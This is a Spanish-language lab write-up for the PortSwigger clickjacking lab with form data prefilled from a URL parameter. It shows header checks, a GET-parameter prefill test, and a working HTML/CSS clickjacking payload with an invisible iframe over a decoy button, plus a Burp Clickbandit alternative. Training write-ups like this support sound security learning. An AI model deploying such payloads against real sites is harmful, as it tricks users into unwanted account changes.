---
title: "Clickjacking with form input data prefilled from a URL parameter"
description: "Laboratorio de Portswigger sobre Clickjacking"
date: 2025-03-26 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - Clickjacking
tags:
  - Portswigger Labs
  - Clickjacking
  - Clickjacking with form input data prefilled from a URL parameter
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

El objetivo del `laboratorio` es cambiar la `dirección de correo electrónico` del usuario rellenando previamente un `formulario` mediante un `parámetro en la URL` y `engañando` al `usuario` para que `haga click` en un botón de `"Actualizar correo electrónico"`, llevando así a cabo, un `ataque de Clickjacking`. El `laboratorio` se considerará resuelto cuando la `dirección de correo electrónico` haya sido cambiada. Podemos `iniciar sesión` en nuestra propia cuenta utilizando las credenciales `wiener:peter`

---

## Resolución

Al `acceder` a la `web` vemos esto

![](/assets/img/Clickjacking-Lab-2/image_1.png)

Si hacemos click sobre `My account` nos podemos `loguear` con las credenciales `wiener:peter`

![](/assets/img/Clickjacking-Lab-2/image_2.png)

Después de `iniciar sesión` vemos que podemos `cambiarnos` el `correo electrónico`

![](/assets/img/Clickjacking-Lab-2/image_3.png)

Si pulsamos sobre `View post` vemos que hay una sección de comentarios

![](/assets/img/Clickjacking-Lab-2/image_4.png)

Para ver si una `web` es `vulnerable` a `Clickjacking` podemos usar la herramienta `shcheck` [https://github.com/santoru/shcheck.git](https://github.com/santoru/shcheck.git()) para `identificar` las `cabeceras de seguridad`

```
# shcheck.py -i -x -k https://0a1800bc042c20d98f01497400e5002b.web-security-academy.net/

======================================================
 > shcheck.py - santoru ..............................
------------------------------------------------------
 Simple tool to check security headers on a webserver 
======================================================

[*] Analyzing headers of https://0a1800bc042c20d98f01497400e5002b.web-security-academy.net/
[!] URL Returned an HTTP error: 404
[*] Effective URL: https://0a1800bc042c20d98f01497400e5002b.web-security-academy.net/
[!] Missing security header: X-XSS-Protection
[!] Missing security header: X-Frame-Options
[!] Missing security header: X-Content-Type-Options
[!] Missing security header: Strict-Transport-Security
[!] Missing security header: Content-Security-Policy
[!] Missing security header: X-Permitted-Cross-Domain-Policies
[!] Missing security header: Referrer-Policy
[!] Missing security header: Expect-CT
[!] Missing security header: Permissions-Policy
[!] Missing security header: Cross-Origin-Embedder-Policy
[!] Missing security header: Cross-Origin-Resource-Policy
[!] Missing security header: Cross-Origin-Opener-Policy

[*] No information disclosure headers detected

[*] No caching headers detected
-------------------------------------------------------
[!] Headers analyzed for https://0a1800bc042c20d98f01497400e5002b.web-security-academy.net/
[+] There are 0 security headers
[-] There are not 12 security headers
```

Si preferimos usar una herramienta `web` podemos usar `securityheaders` [https://securityheaders.com/](https://securityheaders.com/) 

![](/assets/img/Clickjacking-Lab-2/image_5.png)

En este caso, vemos que la `web` no tiene ni `Content-Security-Policy (CSP)` ni `X-Frame-Options`, lo cual la hace vulnerable a `Clickjacking`

Algunos `sitios web` que requieren completar y enviar `formularios` permiten `rellenar previamente` los datos del `formulario` mediante `parámetros GET` antes del `envío`. Dado que los `valores GET` forman parte de la `URL`, la `URL de destino` puede `modificarse` para incorporar `valores elegidos por el atacante`

Hay otros `sitios web` que pueden requerir `interacción por parte del usuario`, como que el usuario `ingrese manualmente los datos`, complete `pasos previos` (como una `verificación CAPTCHA`) antes de `habilitar el envío`, etc

Para `comprobar` si `el formulario permite rellenar previamente los datos mediante parámetros GET`, lo primero que necesitamos hacer es `identificar` los `nombres` de los `campos`. En este caso vemos que el valor del campo a `rellenar` es `email`

![](/assets/img/Clickjacking-Lab-2/image_6.png)

El siguiente paso es `añadir` el `parámetro email` a la `URL` y ver si se `rellena` el `campo email del formulario`, para ello, accedemos a `https://0a1800bc042c20d98f01497400e5002b.web-security-academy.net/my-account?email=pwned@gmail.com` y vemos que sí que funciona

![](/assets/img/Clickjacking-Lab-2/image_7.png)

Una vez comprobado esto, ya podemos `construir` un `payload`, para ello, nos dirigimos al `Exploit Server` y pegamos este `payload`

```
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.3;
       z-index: 2;
   }
   div {
       position:absolute;
       top:450px;
       left:75px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://0a1800bc042c20d98f01497400e5002b.web-security-academy.net/my-account?email=pwned@gmail.com"></iframe>
```

![](/assets/img/Clickjacking-Lab-2/image_8.png)

Pinchamos sobre `View exploit` para `comprobar` que está `bien centrado` el `div` que contiene el texto `Click me`

![](/assets/img/Clickjacking-Lab-2/image_9.png)

Una vez comprobado `modificamos` la `opacidad` a `0`

```
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0;
       z-index: 2;
   }
   div {
       position:absolute;
       top:450px;
       left:75px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://0a1800bc042c20d98f01497400e5002b.web-security-academy.net/my-account?email=pwned@gmail.com"></iframe>
```

![](/assets/img/Clickjacking-Lab-2/image_10.png)

Otra forma alternativa sería usando la herramienta `Clickbandit` de `Burpsuite`, para usarla nos dirigimos a `Burpsuite` y pulsamos `Burp > Burp Clickbandit`

![](/assets/img/Clickjacking-Lab-2/image_11.png)

Pulsamos sobre `Copy Clickbandit to clipboard`

![](/assets/img/Clickjacking-Lab-2/image_12.png)

Nos dirigimos a `Chrome`, nos abrimos la `consola de desarrollador` y `pegamos` ahí todo el `código`

![](/assets/img/Clickjacking-Lab-2/image_13.png)

Una vez hecho esto nos saldrá este `menú`

![](/assets/img/Clickjacking-Lab-2/image_14.png)

Pulsamos en `Start` y `marcamos` la casilla `Disable click actions` para `desactivar` los `clicks`

![](/assets/img/Clickjacking-Lab-2/image_15.png)

Lo siguiente sería `pulsar sobre el botón que queremos`, en este caso sobre `Update email` que es el que queremos usar para el `ataque de Clickjacking`

![](/assets/img/Clickjacking-Lab-2/image_16.png)

Una vez hecho esto, `pulsamos` sobre `Finish` y se nos `mostrará` como es nuestro `payload` actualmente

![](/assets/img/Clickjacking-Lab-2/image_17.png)

Usando los símbolos `-` y `+`, podemos `subir` o `bajar` el `aumento`, y con `Toogle transparency` podemos `activar` o `desactivar` la `transparencia`. En mi caso, lo voy a dejar de esta forma. Cuando ya lo tengamos como queremos, pulsamos en `Save` y se nos `descargará` un `documento HTML`

![](/assets/img/Clickjacking-Lab-2/image_18.png)

`Pegamos` el `código` en el `Exploit server`

![](/assets/img/Clickjacking-Lab-2/image_19.png)

Pulsamos sobre `View exploit` para ver si se ve correctamente

![](/assets/img/Clickjacking-Lab-2/image_20.png)

Hacemos `click sobre el botón`

![](/assets/img/Clickjacking-Lab-2/image_21.png)

Nos dirigimos a  `My account` para ver `si ha funcionado el ataque`, y vemos que así es. Una vez comprobado que se `ve` y `funciona` correctamente, pulsamos sobre `Deliver exploit to victim` y completamos el `laboratorio`. Debemos tener en cuenta que `dos usuarios no pueden tener el mismo email`, por lo tanto deberemos `modificar el nuestro o el email que se usa en el payload`

![](/assets/img/Clickjacking-Lab-2/image_22.png)
